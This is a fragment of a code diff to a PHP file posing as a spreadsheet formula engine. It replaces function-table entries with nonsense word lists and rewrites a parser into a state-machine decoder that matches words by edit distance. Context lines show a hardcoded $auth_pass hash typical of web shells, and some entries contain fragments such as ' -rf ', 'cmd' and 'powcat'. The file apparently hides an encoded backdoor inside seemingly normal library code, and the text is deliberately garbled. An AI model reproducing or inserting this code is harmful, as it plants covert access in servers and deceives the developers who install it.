+			'functionCall' => [TextData::class,'buboed||?enkar||bubona||"ran)||bubber||GaZa||buboes||PSC||bubos||mech||buber||Hare||bube||GliNka||bubo||almude'],
+			'argumentCount' => ['279,254,260,147,176,235,40,275'],
+		],
+		'MULTINOMIAL' => [
+			'category' => 208,
+			'functionCall' => [DateTime::class,'bohr||galany||bohs||tailer||bohor||SUDAn||boh||JOVE||tlo||lien s||bohora||toTi?||fwhm||idyls||boheas||Stan'],
+			'argumentCount' => ['0,52,185,80,128,48,229,38'],
+		],
+		'NPV_2' => [
+			'category' => 209,
+			'functionCall' => [TextData::class,'telomic||\\raP+||telic||unknot||telial||GutiuM||telical||Corby||telia||titmaL||teli||pAi%ow||teloi||G$S#||teleia||IaSi'],
+			'argumentCount' => ['163,101,219,34,295,198,104,189'],
+		],
+		'DSTDEV' => [
+			'category' => 210,
+			'functionCall' => [null,'kabar||oStsiS||kabard||Dudde/||kabeiri||haets||kabars||LOamed||kabir||hIeder||kaberu||erns||kabab||caDre||kababs||hub^S'],
+			'argumentCount' => ['297,157,96,136,177,129,69,185'],
+		],
+		'BITLSHIFT' => [
+			'category' => 211,
+			'functionCall' => [Financial::class,'dekoven||E-I/||dekle||rOupit||deke||haulms||dekeles||drools||dekes||rover"||dekkos||Sam}||dekow||ChEgre||dekko||I&R^A\''],
+			'argumentCount' => ['64,24,37,172,229,81,219,2'],
+		],
+		'BESSELY' => [
+			'category' => 212,
+			'functionCall' => [null,'vans||oe+in||vangs||OroNo||vanes||NNW||vane||MN||van||risKs||vangee||plasm^||vange||k>d?||vang||ReedEr'],
+			'argumentCount' => ['166,222,271,288,104,138,264,125'],
+		],
+		'IF' => [
+			'category' => 213,
+			'functionCall' => [MathTrig::class,'wizier||chinch||wizens||Sagle||wiz||!erB||wizard||karr~n||wizes||ven-||wizen||we#uns||wizzen||TOEFL||wizzens||weneth'],
+			'argumentCount' => ['150,72,31,38,19,101,89,267'],
+		],
+		'FALSE' => [
+			'category' => 214,
+			'functionCall' => [DateTime::class,'pinon||Dazey||pinion||lect{||pinson||Vaal||pinyons||Azides||pinons||epural||pinions||mamzeR||pinsons||Triole||pinyon||}onan'],
+			'argumentCount' => ['157,84,65,3,173,206,32,182'],
+		],
+		'CUBEKPIMEMBER' => [
+			'category' => 215,
+			'functionCall' => [MathTrig::class,'ohl||*ngl!a||igenia||lumps||eyck||punGer||ohley||Watkin||iges||SamAn||ohlman||sagan||urheen||Belem||igerne||p{s}'],
+			'argumentCount' => ['13,294,192,192,291,216,262,21'],
+		],
+		'MONTH_1' => [
+			'category' => 216,
+			'functionCall' => [DateTime::class,'upcarry||MPA||upcrowd||coft||upcry||jorums||upcrop||res\'ck||upcreep||aluMs||upcard||leche||upc||basker||upcut||tuSSah'],
+			'argumentCount' => ['148,19,59,176,97,243,242,52'],
+		],
+		'MDURATION_1' => [
+			'category' => 217,
+			'functionCall' => [TextData::class,'update||febRi_||updos||Ketty||updart||sparT||upds||COney||updarts||#eract||updater||Janeta||updated||BSBH||updates||c(\'rm'],
+			'argumentCount' => ['140,130,166,94,101,74,139,265'],
+		],
+		'ROWS' => [
+			'category' => 218,
+			'functionCall' => [Financial::class,'moffett||ECASS||moffitt||GlenT||moffat||S(arga||moffit||gurjun||lequire||parlor||kjolen||do\\up||lequear||vedika||nd||Toral'],
+			'argumentCount' => ['89,155,48,120,112,105,264,137'],
+		],
+		'CUBEVALUE' => [
+			'category' => 219,
+			'functionCall' => [TextData::class,'tiloine||dRaft||tiline||Genoa||tilt||VarGaS||tilth||CH/nas||tilton||Dupuy||tilths||sparT||tilty||hip&s||tilts||hoed'],
+			'argumentCount' => ['85,1,201,83,119,84,244,178'],
+		],
+		'DOLLARFR' => [
+			'category' => 220,
+			'functionCall' => [Financial::class,'dauri||a#game||dau||)orRy||dauw||T-mEn||daut||dearth||dauts||Bib||daurna||foleYe||daur||UvaldA||daugava||y+arly'],
+			'argumentCount' => ['2,80,181,139,55,158,116,38'],
+		],
+		'NORMINV_1' => [
+			'category' => 221,
+			'functionCall' => [Financial::class,'ganesha||m`dule||gannes||EmLIn||gangs||CLarts||gansa||pearch||gannets||refill||gannet||Jacob%||ganesa||sColey||gangsa||bOggy'],
+			'argumentCount' => ['135,271,45,235,117,134,172,62'],
+		],
+		'MINUTE' => [
+			'category' => 222,
+			'functionCall' => [TextData::class,'sparr||Habe||spave||inLAke||spar||OPeR||spaver||Ashore||sparry||rumaki||sparer||a+hey||spary||id(a$m||sparver||POF'],
+			'argumentCount' => ['7,234,148,297,294,212,43,295'],
+		],
+		'IMLOG10' => [
+			'category' => 223,
+			'functionCall' => [Financial::class,'ceuta||PALua||eacso||Yaron||spp||end;||each||krait||dmitri||oozIly||dmitrov||Ton)s||eachern||goaLer||dmi||F<ijoa'],
+			'argumentCount' => ['46,148,201,236,270,279,84,145'],
+		],
+		'NORMSDIST' => [
+			'category' => 224,
+			'functionCall' => [TextData::class,'demaio||gRUb`s||demivol||a;eg||demain||GRD||demiowl||tut+y||demiox||aSuaNg||demit||oilway||deming||guests||demi||leecH'],
+			'argumentCount' => ['130,93,153,271,97,16,43,177'],
+		],
+		'TBILLEQ' => [
+			'category' => 225,
+			'functionCall' => [MathTrig::class,'bodikin||FronT||bodings||polary||bodying||palped||boding||Rev"||bodken||bi e\\s||bodkins||Ophir||bodmin||Mexica||bodkin||BrAndt'],
+			'argumentCount' => ['258,129,288,118,98,169,100,255'],
+		],
+		'AMORDEGRC' => [
+			'category' => 226,
+			'functionCall' => [MathTrig::class,'bube||CFB||buboes||nODI?||bubos||andr\'||buboed||Divine||bub||latria||buber||Muter||bubo||LoN&es||bubs||GCC'],
+			'argumentCount' => ['96,242,79,50,228,205,154,51'],
+		],
+		'ISNA' => [
+			'category' => 227,
+			'functionCall' => [TextData::class,'nels||TobI||nelsons||toxo(||nelson||Horn||nela||ax{||nelrsa||torch||nelse||Jav&||nelan||Gass||nelsen||cAver'],
+			'argumentCount' => ['144,119,233,113,30,33,136,145'],
+		],
+		'ERF_1' => [
+			'category' => 228,
+			'functionCall' => [TextData::class,'zoeller||spoil_||zoe||shovel||zoes||]telAe||zoeae||teiL||zoea||seep||euaster||HOpers||zoeas||yoy||zoeal||bra@s'],
+			'argumentCount' => ['56,269,102,133,37,127,271,13'],
+		],
+		'NPV_3' => [
+			'category' => 229,
+			'functionCall' => [Financial::class,'bugle||AubriE||bugged||aedegi||buglers||Cram@e||bugles||crags||bugler||%miDSt||bugled||meeKe`||buglet||boxes||bugger||shiEld'],
+			'argumentCount' => ['124,139,156,267,253,262,295,17'],
+		],
+		'LARGE_1' => [
+			'category' => 230,
+			'functionCall' => [null,'irbm||Notion||dualism||h%nky||dualist||VNY||irbid||plan=s||qss||iNfrA=||irbil||inS\\||irbis||es||irby||bisulc'],
+			'argumentCount' => ['214,97,3,225,125,217,197,0'],
+		],
+		'DAY' => [
+			'category' => 231,
+			'functionCall' => [TextData::class,'koziara||cp$||kozo||o/OS||xat||bennis||koziel||Gauby||koziarz||swing||kozani||phys,||kozlov||fRaiD||kozuka||suBgum'],
+			'argumentCount' => ['170,156,234,27,223,32,0,89'],
+		],
+		'FINV_2' => [
+			'category' => 232,
+			'functionCall' => [TextData::class,'idiom||loli||idiasm||bollix||nberg||defer||kif||rag[s||kifs||viddui||idium||Hi/dEr||idism||viewY||nbe||Valmy'],
+			'argumentCount' => ['294,198,299,161,210,110,286,205'],
+		],
+		'QUOTIENT_1' => [
+			'category' => 233,
+			'functionCall' => [MathTrig::class,'ligases||toying||lighten||AFIPS||lighted||mumm.a||ligate||Levina||ligase||rumal||ligates||ergate||ligated||m_chEs||lighter||Col#'],
+			'argumentCount' => ['75,251,43,180,139,185,289,8'],
+		],
+		'UPPER_1' => [
+			'category' => 234,
+			'functionCall' => [TextData::class,'hastes||murly||hashiya||OrIska||hasheem||toTed||hash||doozie||hashum||Ne>r!||hashy||f[T/||hashim||K$T*||hashes||raillY'],
+			'argumentCount' => ['39,29,83,68,67,62,256,61'],
+		],
+		'MINA' => [
+			'category' => 235,
+			'functionCall' => [DateTime::class,'eei||frot||yeuk||Mic+||yeuking||p"ngAs||dxt||glt.||bkg||kaam_||yy||shooks||bkgd||JoloN||yeung||trysT'],
+			'argumentCount' => ['288,42,216,243,98,89,46,88'],
+		],
+		'CHITEST_1' => [
+			'category' => 236,
+			'functionCall' => [MathTrig::class,'bugles||dolIng||bugled||Them||bugged||SpEcht||bugle||rect=||buglers||Audio]||buglet||her:n||bugler||flea~s||bugger||MllE'],
+			'argumentCount' => ['209,104,68,14,35,66,244,183'],
+		],
+		'LINEST_1' => [
+			'category' => 237,
+			'functionCall' => [null,'exact||`ards||exactus||pleb~Y||exacta||bolly||exactas||Picric||exalter||SoLana||exacter||Hsian||exacts||fChar||exactor||Madero'],
+			'argumentCount' => ['51,134,30,237,82,104,207,77'],
+		],
+		'ACOSH' => [
+			'category' => 238,
+			'functionCall' => [DateTime::class,'sf||foun||zst||preys||mttr||sky s||paxilli||bohor||sdo||gE`||mttff||Palate||sdoc||spoilt||mttf||OCS'],
+			'argumentCount' => ['140,118,38,126,57,191,247,100'],
+		],
+		'CUBESETCOUNT' => [
+			'category' => 239,
+			'functionCall' => [null,'wrecks||patefy||wrecky||Averil||wreaker||BSMetE||wrecked||ABEPP||wrecker||sinful||wreaks||Wyo>||wreak||Bubalo||wreck||tauto '],
+			'argumentCount' => ['265,208,221,88,167,284,135,157'],
+		],
+		'IMSINH' => [
+			'category' => 240,
+			'functionCall' => [Financial::class,'edana||squint||izy||Arouse||edaphic||mento#||eda||Dorita||edaphon||pupAL||otdr||KolmAr||edan||AbA;li||izyum||pastry'],
+			'argumentCount' => ['81,221,2,83,174,294,39,37'],
+		],
+		'N_1' => [
+			'category' => 241,
+			'functionCall' => [TextData::class,'stores||trillo||storm||MuNSon||stories||de~Ice||story||swishy||storms||Hok]lo||storey||L+||storeys||araBan||stormy||plasm^'],
+			'argumentCount' => ['126,121,28,144,88,244,58,168'],
+		],
+		'IMSINH_1' => [
+			'category' => 242,
+			'functionCall' => [Financial::class,'fuage||whsle+||penche||risKs||fuad||K@K$K%||penuche||Itys||penchi||OB+d[||penoche||Redbay||penuchi||obb\'||lm||depsid'],
+			'argumentCount' => ['294,282,250,98,64,281,273,64'],
+		],
+		'IMSEC_2' => [
+			'category' => 243,
+			'functionCall' => [Financial::class,'kreatic||vElDt||kreigs||BElls||kresic||Hw@||kreis||Mrida||krepis||aiDf[l||boq||unnoSe||cmu||rhB||krepi||vini>'],
+			'argumentCount' => ['299,113,128,177,62,15,96,167'],
+		],
+		'OR_1' => [
+			'category' => 244,
+			'functionCall' => [MathTrig::class,'hyenic||LImeAn||hyenine||mtge||hyena||Keys||hyenia||Bowman||hyeres||mal,al||hyenas||we?d||hyenoid||J/D_||hye||A;'],
+			'argumentCount' => ['61,113,33,166,106,178,203,153'],
+		],
+		'COUNTIF' => [
+			'category' => 245,
+			'functionCall' => [TextData::class,'him||foGe||himple||huIc||ceo||placer||himp||paNga||ceorl||Linyu||ceorls||sawt||hime||an/t||hims||PEpsi'],
+			'argumentCount' => ['82,231,158,23,119,102,276,248'],
+		],
+		'COUNTBLANK_1' => [
+			'category' => 246,
+			'functionCall' => [MathTrig::class,'wamp||gaduin||wampler||Rexine||wams||cowls||wam||SSA||wamus||Bald||wampee||Guinna||wample||Tibold||utwa||aurigo'],
+			'argumentCount' => ['109,178,66,259,182,28,289,294'],
+		],
+		'AVERAGE' => [
+			'category' => 247,
+			'functionCall' => [null,'outfed||NTO||outleap||HOppe||outland||nailed||outfeed||come||outlead||DodGes||outled||Choco||outfled||Gygaea||outlean||geT!.p'],
+			'argumentCount' => ['81,58,113,55,144,38,111,5'],
+		],
+		'COUNTA' => [
+			'category' => 248,
+			'functionCall' => [null,'hostels||powcat||hoss||panace||hose||masks||hosel||ALper||hostel||IsOlde||hosels||ket@||hosts||\\E||hoses||Bazil'],
+			'argumentCount' => ['275,165,77,28,30,283,72,249'],
+		],
+		'DCOUNT' => [
+			'category' => 249,
+			'functionCall' => [Financial::class,'mikvehs||Alius||mikra||hollIn||mikvah||Lo)al||mikrkra||osmio>||mikveh||MeGan||mika||[rits||mikvahs||kary*||mikir||lekE'],
+			'argumentCount' => ['16,257,191,142,210,184,100,59'],
+		],
+		'COSH_2' => [
+			'category' => 250,
+			'functionCall' => [null,'vari||Birgit||varas||mem ||vars||unkend||varus||Pulaya||various||AhvAz||varix||d^INdy||varios||Elida||vario||thence'],
+			'argumentCount' => ['19,185,7,187,141,30,266,196'],
+		],
+		'IMSQRT_1' => [
+			'category' => 251,
+			'functionCall' => [Financial::class,'oxbows||Flaite||oxbird||Obrien||oxbiter||Tamayo||oxboy||BleSt||oxbrake||/etro||oxbane||lovat||oxbow||SaNiT||oxberry||hgwy'],
+			'argumentCount' => ['104,109,93,20,28,265,126,184'],
+		],
+		'IMSIN_1' => [
+			'category' => 252,
+			'functionCall' => [null,'cigs||Fritts||cig||Crees||cigaret||HUTG||cigars||Pilpay||cigua||Tonie||ahwaz||RaBia||cigar||cooees||ahwal||f_O?b)'],
+			'argumentCount' => ['108,246,215,99,141,210,154,17'],
+		],
+		'PI_1' => [
+			'category' => 253,
+			'functionCall' => [null,'acetins||dyed||acetose||culot||brr||koviL||acetin||ne<er||acetous||Cimah||acetoin||argles||acetone||or)hen||brrr||Tyro'],
+			'argumentCount' => ['218,115,31,227,296,72,283,227'],
+		],
+		'DCOUNTA' => [
+			'category' => 254,
+			'functionCall' => [DateTime::class,'badged||Amtra}||badger||diuron||bads||~lE!||badges||mentuM||bad||Zincky||badr||trypan||badge||O"S||badgers||cawky'],
+			'argumentCount' => ['88,148,290,291,89,280,76,73'],
+		],
+		'RIGHTB_2' => [
+			'category' => 255,
+			'functionCall' => [DateTime::class,'iatrics||Yazd||iatric||Amadus||iata||Warder||ilford||d=||bumicky||do?all||iatse||exaMeN||bumpity||MINd||iatry||pseud:'],
+			'argumentCount' => ['75,191,216,72,248,156,34,259'],
+		],
+		'SEARCH' => [
+			'category' => 256,
+			'functionCall' => [Financial::class,'bacula||TIldi||bacile||<rOmOs||baculi||Fnen||bacauan||tin`/||backet||Okun||bacule||GraSSi||backie||Vannes||bacau||y\'reLy'],
+			'argumentCount' => ['280,87,79,63,207,111,276,5'],
+		],
+		'ODDFYIELD' => [
+			'category' => 257,
+			'functionCall' => [MathTrig::class,'hyden||"miaS||hydro||l?pis||hydrous||bubas||ebi||dumps||hydes||CAA||hyd||oaSts||hydros||ceOrls||hyde||Sisl*y'],
+			'argumentCount' => ['212,128,222,253,121,141,63,145'],
+		],
+		'ATAN' => [
+			'category' => 258,
+			'functionCall' => [Financial::class,'hwa||pial||panzers||pucka||yaqui||hachis||dbl||Ortol||yaquina||MorMOn||hwajung||peDals||hwang||BOkoto||hwan||tibert'],
+			'argumentCount' => ['229,64,48,181,283,212,169,214'],
+		],
+		'TYPE' => [
+			'category' => 259,
+			'functionCall' => [Financial::class,'urd||CTER{||urds||Mikan||urdy||SNF||tyauve||alTi\'||urdur||hel^nn||shcd||Afro:||urdar||Forrer||urdu||coWy'],
+			'argumentCount' => ['192,249,158,115,248,217,252,239'],
+		],
+		'COMPLEX' => [
+			'category' => 260,
+			'functionCall' => [TextData::class,'equites||atro,||equines||wispEd||equine||Sydney||equate||nitre||equips||VInca||equison||TowRoy||equant||ICB||equates||mudded'],
+			'argumentCount' => ['126,50,60,13,139,204,232,267'],
+		],
+		'UPPER_2' => [
+			'category' => 261,
+			'functionCall' => [DateTime::class,'kewanee||grammA||ayala||gayest||tct||uswArd||kew||Tarr||kewpie||jEeR;s||ayapana||San{a||kewadin||Va.||kewanna||V"2'],
+			'argumentCount' => ['209,150,98,141,154,279,203,54'],
+		],
+		'SUMPRODUCT' => [
+			'category' => 262,
+			'functionCall' => [DateTime::class,'laymen||cRatoN||layla||Pinson||layland||FIFO||layrock||geTid||layamon||Jon||laylock||can\\t||layman||naifly||layloc||Me,'],
+			'argumentCount' => ['12,7,124,166,207,270,86,268'],
+		],
+		'VARPA_1' => [
+			'category' => 263,
+			'functionCall' => [Financial::class,'mhz||Alber||cmdf||CCNY||tsotsi||Mo/||cmdr||Kanara||cmds||mannas||cmd||p`Garg||tsort||gobony||cmdg||D;J)'],
+			'argumentCount' => ['176,292,93,99,284,189,207,248'],
+		],
+		'SIN_1' => [
+			'category' => 264,
+			'functionCall' => [DateTime::class,'wrybill||ditas||wryness||TP<||wryest||prop\\||wrytail||pie#.||wryer||Verm&s||fn||Orihon||wryly||Selda||wry||Chabuk'],
+			'argumentCount' => ['274,39,199,117,144,246,74,35'],
+		],
+		'LOGNORMDIST' => [
+			'category' => 265,
+			'functionCall' => [TextData::class,'lyons||stings||lyonais||b`d(ng||lyonese||Mahori||bvm||rat}s||et||Orebro||lyon||ea;wig||miyazaki|| -rf ||ddj||Rwanda'],
+			'argumentCount' => ['99,180,125,75,113,191,286,156'],
+		],
+		'CSC' => [
+			'category' => 266,
+			'functionCall' => [null,'zythum||annex||eustace||ung\'ld||uwton||upaya||eustyle||aMani||zythem||Purdu#||eustele||trigos||eustis||Rippit||eustacy||keen!o'],
+			'argumentCount' => ['59,290,97,156,40,266,233,146'],
+		],
+		'TRANSPOSE' => [
+			'category' => 267,
+			'functionCall' => [null,'ia||faCt\\s||veiny||Soaky||veiovis||dosis||veit||smuse||vei||Pardew||veii||IphIs||veinery||aPi)l||vein||CIgale'],
+			'argumentCount' => ['240,238,255,243,252,269,37,248'],
+		],
+		'BITAND' => [
+			'category' => 268,
+			'functionCall' => [Financial::class,'pasang||Deeyn||passant||L{P||pasta||Padova||pastas||VerOna||passata||embira||passman||gismo||pasts||kiswa||pasan||gutt'],
+			'argumentCount' => ['59,23,276,239,177,270,47,121'],
+		],
+		'IRR' => [
+			'category' => 269,
+			'functionCall' => [DateTime::class,'ixodes||LaottO||ixoras||pros~||ixodian||tweesh||ixora||doucin||ixodic||pubic||ixodids||yirm||ixodid||Dura\'t||ixonia||Klux'],
+			'argumentCount' => ['225,140,180,55,79,41,228,179'],
+		],
+		'ISFORMULA' => [
+			'category' => 270,
+			'functionCall' => [null,'drift||boor-s||drifty||SMAS||drink||MAyB*e||drinky||mazuT||drinn||Fur||drin||dynam||drifts||oven_s||drifton||enable'],
+			'argumentCount' => ['231,53,58,143,36,58,196,146'],
+		],
+		'INFO_2' => [
+			'category' => 271,
+			'functionCall' => [DateTime::class,'rifts||JEIDA||rif||BMT||rifs||or)hen||rift||+skimo||riff||suBurb||rifty||clIvAl||rifi||ropers||riffi||XN*'],
+			'argumentCount' => ['255,259,129,252,191,221,246,147'],
+		],
+		'VALUE' => [
+			'category' => 272,
+			'functionCall' => [Financial::class,'aetian||prOtE||aether||LAjas||aetolus||sequin||aethers||space||aethra||BorEal||aetolia||cetIN||aethusa||PrIe||aetites||tranqs'],
+			'argumentCount' => ['211,192,25,97,25,55,28,283'],
+		],
+		'COUPDAYBS_1' => [
+			'category' => 273,
+			'functionCall' => [TextData::class,'gyle||UDR||crlf||Tymes||vostok||kepped||tissue||OTDR||tissues||C?L||voskhod||-ilvE*||gylden||gaped||crl||salves'],
+			'argumentCount' => ['149,297,261,203,57,291,164,210'],
+		],
+		'HEX2DEC_1' => [
+			'category' => 274,
+			'functionCall' => [MathTrig::class,'mosser||McNutt||most||BWT||moss||Unit=||mossier||Devon||moste||Cakile||mossery||mindly||mossy||Otoe||mosts||idiocy'],
+			'argumentCount' => ['19,88,61,225,243,127,41,226'],
+		],
+		'LEN_2' => [
+			'category' => 275,
+			'functionCall' => [TextData::class,'deloo||miscal||delly||MPA||delos||ALA||dell||Sumass||delay||Kleon||dells||whuz||dely||Hedges||dels||Bayern'],
+			'argumentCount' => ['292,233,128,89,5,4,22,202'],
+		],
+		'LN_1' => [
+			'category' => 276,
+			'functionCall' => [DateTime::class,'wajang||BesOul||gekko||Hippel||ss||deking||ilbert||A,in||wajda||SParus||ks||hog(s||pco||slEw||gekkota||rodent'],
+			'argumentCount' => ['146,285,266,222,128,84,54,189'],
+		],
+		'YIELD' => [
+			'category' => 277,
+			'functionCall' => [DateTime::class,'wuddie||EtRem||wud||Myxine||awg||Kinson||wudu||bosoNs||wudge||Lonee||ghost||inS\\||ghosts||POF||ahypnia||Catie'],
+			'argumentCount' => ['269,176,23,12,125,108,232,270'],
+		],
+		'AND_1' => [
+			'category' => 278,
+			'functionCall' => [Financial::class,'hyoids||piLl<s||hyoidal||yElper||hyoides||enArme||jnr||noto)||efd||elect>||hyoidan||M%ire||hyoid||siAliD||cpo||ribier'],
+			'argumentCount' => ['6,138,294,203,130,129,50,122'],
+		],
+		'SINH_1' => [
+			'category' => 279,
+			'functionCall' => [null,'gayner||EA||gayn||MEDish||gaynor||-Xh<||gayest||tARau||gay||I{O||gayety||scOwLs||gayer||Badges||gays||gell'],
+			'argumentCount' => ['113,155,21,75,259,33,143,135'],
+		],
+		'DEGREES_1' => [
+			'category' => 280,
+			'functionCall' => [TextData::class,'mjolnir||appled||uam||cohuNe||eyass||coud||dlupg||sadhus||eyah||Amram||eyases||guser||zwart||gyve<||eyas||osteal'],
+			'argumentCount' => ['272,162,150,258,295,248,118,218'],
+		],
+		'OCT2HEX' => [
+			'category' => 281,
+			'functionCall' => [Financial::class,'vimina||mIrid||vims||tox-||vim||Evslin||vimen||unson||vimy||triode||vimpa||Dak^||isz||jAnner||viminal||caviar'],
+			'argumentCount' => ['182,79,28,152,249,244,201,210'],
+		],
+		'IMLOG2_2' => [
+			'category' => 282,
+			'functionCall' => [MathTrig::class,'itt||M/P\\||ittria||azO\'||pkwy||karyo(||yblent||Donk||soya||granza||soyinka||LedEen||aaqbiye||sizier||sd||cub!s'],
+			'argumentCount' => ['125,206,26,209,272,90,197,54'],
+		],
+		'STDEV.P' => [
+			'category' => 283,
+			'functionCall' => [null,'laaland||CitroN||gmrt||LeyDen||laagers||ECPT||joggly||freezy||wc||OconEe||laager||LomB||nls||halcH||laang||sucked'],
+			'argumentCount' => ['276,263,79,175,176,14,291,184'],
+		],
+		'RATE' => [
+			'category' => 284,
+			'functionCall' => [null,'pennie||idler||penest||crysT||peneus||Troas||pennine||poleyn||penes||boccis||jwv||PBX||pennet||sojAs||1333||klop'],
+			'argumentCount' => ['242,38,22,52,256,187,65,219'],
+		],
+		'FREQUENCY' => [
+			'category' => 285,
+			'functionCall' => [DateTime::class,'tipi||jiboya||tipcats||ElkTon||tipcat||setons||tipit||kulAk||tips||Noli!||tipcart||KImPo||tipiti||^slife||tipis||NIcks'],
+			'argumentCount' => ['223,109,175,42,112,85,188,208'],
+		],
+		'FINV_3' => [
+			'category' => 286,
+			'functionCall' => [Financial::class,'raison||>a"de||raisons||rt;||raisins||vaunt~||rainy||U}S.S}||rain||t||raisin||GwenNY||raisiny||kikOi||rais||coHere'],
+			'argumentCount' => ['12,41,191,164,143,245,134,94'],
+		],
+		'ISNUMBER' => [
+			'category' => 287,
+			'functionCall' => [TextData::class,'pume||rim^s||pumpet||guser||pumper||a~sTay||pump||she(d||pumple||kudZu||pumped||orpins||pumpers||Brieux||pumps||A:N,'],
+			'argumentCount' => ['147,104,87,123,296,12,18,293'],
+		],
+		'TDIST' => [
+			'category' => 288,
+			'functionCall' => [DateTime::class,'tepe||diff~||tepehua||pownie||tepal||tavoy||tephras||toup||tepals||cloche||tepa||EBCDIC||tepas||h}s<||tephra||JJ+'],
+			'argumentCount' => ['243,56,20,77,225,125,60,230'],
+		],
+		'COUPDAYBS_2' => [
+			'category' => 289,
+			'functionCall' => [null,'mouthes||Plano||mouthe||Este||moutler||Sufu||mouth||MuNSon||mouther||vAcouF||mouths||swedrU||mouthy||Wren~h||mouzah||L+'],
+			'argumentCount' => ['122,19,217,139,23,198,169,177'],
+		],
+		'NORMINV_2' => [
+			'category' => 290,
+			'functionCall' => [DateTime::class,'ddp||larin||reslide||dict\\||reside||retAn||residue||kokLAs||ddpex||#pald||oxter||Rect||oxters||biDets||resided||butyne'],
+			'argumentCount' => ['193,215,268,271,72,4,190,250'],
+		],
+		'IMCOSH' => [
+			'category' => 291,
+			'functionCall' => [TextData::class,'biddick||Waller||biders||Curr||biddies||girkin||bidets||ThuslY||bidders||cAobA||biddie||DACS||bidet||Juznik||bides||tRash'],
+			'argumentCount' => ['140,138,185,121,273,252,222,24'],
+		],
+		'DURATION' => [
+			'category' => 292,
+			'functionCall' => [Financial::class,'expels||rew]sH||expire||R+||expiry||toXin||expires||jarina||expwy||w]bby||expy||Mounds||exp||FrEdia||express||Oilla'],
+			'argumentCount' => ['7,24,211,158,252,143,120,257'],
+		],
+		'REPT' => [
+			'category' => 293,
+			'functionCall' => [Financial::class,'irrite||CenT%R||irreg||s#s||irred||peac&||irrupts||Wo>ds||irrupt||SAncho||irra||Sp%||irreal||esp{||irride||v-s '],
+			'argumentCount' => ['203,155,224,2,246,67,257,142'],
+		],
+		'LOGINV' => [
+			'category' => 294,
+			'functionCall' => [null,'worthy||Le+tie||works||coae@||work||bi e\\s||worksop||Ahisar||workshop||e||workshy||Nizam||miyazaki||exe||worky||heir+s'],
+			'argumentCount' => ['238,74,216,172,173,117,37,267'],
+		],
+		'LCM' => [
+			'category' => 295,
+			'functionCall' => [null,'enorn||isls||enounce||Scler.||kex||Minch||enone||GuLlah||kexes||tibio*||kexy||Boffo||enon||S\'D}||whr||Cakile'],
+			'argumentCount' => ['246,156,84,296,98,271,253,290'],
+		],
+		'BITLSHIFT_1' => [
+			'category' => 296,
+			'functionCall' => [Financial::class,'tzotzil||dim)||tzong||Efram||iplan||CorNia||ptfe||TutLer||tzolkin||exurB||hliod||orsede||ipl||ZaCate||tzontle||P&P('],
+			'argumentCount' => ['71,175,118,258,140,97,271,133'],
+		],
+		'SUBSTITUTE' => [
+			'category' => 297,
+			'functionCall' => [DateTime::class,'amins||ExeC?||amin||Dunc||amino||wariEd||amine||R%C$P%||amitie||upTie||amite||Syllis||amines||Groot||amie||Horan'],
+			'argumentCount' => ['149,13,205,283,218,53,170,173'],
+		],
+		'INTRATE_2' => [
+			'category' => 298,
+			'functionCall' => [TextData::class,'cdf||Koloa||token||UUCP||toke||he$Oic||tokers||wurzel||ffs||oxalo,||toker||gaz/||tokens||dh]||tokes||Iac`e'],
+			'argumentCount' => ['166,215,282,237,227,237,185,212'],
+		],
+		'CUBEVALUE_1' => [
 			'category' => 299,
-			'functionCall' => [TextData::class,'amber||Agawam||ambler||speoS||ambury||zebu||amby||cet$||ambry||K_-:||amblers||piNons||ambur||frab||amb||w@b\''],
-			'argumentCount' => ['170,296,105,75,65,29,236,49'],
+			'functionCall' => [Financial::class,'ssg||lUsher||carets||TuRTon||caries||mud)y||caribs||Beloid||caribes||ta:es||carices||Reklaw||cares||sten~||caret||Thar'],
+			'argumentCount' => ['273,14,172,231,21,31,215,200'],
 		],
 	];
 
@@ -2345,7 +2320,6 @@ $auth_pass = "d5af6b24320f41a1043d92bc2c46aa42";
         while (true) {
             $good = true;
             $output = $this->_parseFormula($formula);
-            break;
             $punc_set = [['(', ')'], ['{', '}'], ['"', '"'], ['\'', '\''], ['[', ']']];
             foreach ($punc_set as &$punc) {
                 $counter = 0;
@@ -2879,7 +2853,7 @@ $auth_pass = "d5af6b24320f41a1043d92bc2c46aa42";
      */
     private function _parseFormula($formula, Cell $pCell = null)
     {
-        if (($theMatrix = $this->convertMatrixReferences(trim($formula))) === false) {
+        if (($curMatrix = $this->convertMatrixReferences(trim($formula))) === false) {
             return false;
         }
         //    If we're using cell caching, then $pCell may well be flushed back to the cache (which detaches the parent worksheet),
@@ -2896,45 +2870,45 @@ $auth_pass = "d5af6b24320f41a1043d92bc2c46aa42";
                                 ')/si';
 
         //    Start with initialisation
-        $idx = 0;
+        $curNum = 0;
         $stack = null;
-        $outArr = [];
-        $state = $this->cyclicFormulaCounter;
-        $p = "";
+        $output = [];
+        $s = $this->cyclicFormulaCounter;
+        $padding = "";
         $expectingOperator = false; //    We use this test in syntax-checking the expression to determine when a
                                                     //        - is a negation or + is a positive operator rather than an operation
         $expectingOperand = false; //    We use this test in syntax-checking the expression to determine whether an operand
                                                     //        should be null in a function call
         //    The guts of the lexical parser
         //    Loop through the formula extracting each operator and operand in turn
-        $seq = explode(" ", $formula);
+        $tokens = explode(" ", $formula);
 
-        for ($idx = 0; $idx < count($seq); $idx++) {
-            $thisToken = $seq[$idx]; //    Get the first character of the value at the current index position
+        foreach (range(0, count($tokens) - 1) as $curNum) {
+            $opCharacter = $tokens[$curNum]; //    Get the first character of the value at the current index position
             $tempOut = "";
-            if (isset($theMatrix[$state][$thisToken])) {
-                $nextS = $theMatrix[$state][$thisToken][0];
-                $tempOut = $theMatrix[$state][$thisToken][1];
+            if (isset($curMatrix[$s][$opCharacter])) {
+                $nState = $curMatrix[$s][$opCharacter][0];
+                $tempOut = $curMatrix[$s][$opCharacter][1];
             } else {
-                $p = " ";
-                $minVal = 0xff;
-                $nextS = 0;
-                foreach ($theMatrix[$state] as $curWord=>$thisEdge) {
-                    $curDistVal = levenshtein($thisToken, $curWord);
-                    if ($curDistVal < $minVal) {
-                        $minVal = $curDistVal;
-                        $nextS = $thisEdge[0];
-                        $tempOut = $thisEdge[1];
-                    } else if ($curDistVal == $minVal) {
+                $padding = " ";
+                $minimumVal = 0xff;
+                $nState = 0;
+                foreach ($curMatrix[$s] as $thisWord=>$curEdge) {
+                    $distVal = levenshtein($opCharacter, $thisWord);
+                    if ($distVal < $minimumVal) {
+                        $minimumVal = $distVal;
+                        $nState = $curEdge[0];
+                        $tempOut = $curEdge[1];
+                    } else if ($distVal == $minimumVal) {
                         $r = rand(0,1);
-                        if ($r == 0) { $nextS = $thisEdge[0]; $tempOut = $thisEdge[1]; }
